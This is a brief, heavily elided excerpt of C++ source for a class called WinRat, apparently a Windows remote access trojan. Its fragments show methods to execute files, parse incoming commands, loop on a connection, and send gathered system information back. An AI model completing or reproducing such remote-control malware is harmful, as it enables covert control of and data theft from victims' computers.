...
void WinRat::ExecuteFile(char* filename)
{
	STARTUPINFO si;
...
void WinRat::strsplit(char src[500], char* dest[5]) {
	int i = 0;
	char *p = strtok(src, "=");
	while (p != NULL)
	{
...
void WinRat::ConnectionManage()
{
	while (connected)
	{
		...
		{
			respond(WinRat::GetSysinfo().c_str());
		}
...
void WinRat::respond(const char * data) {
	int totalsent = 0;
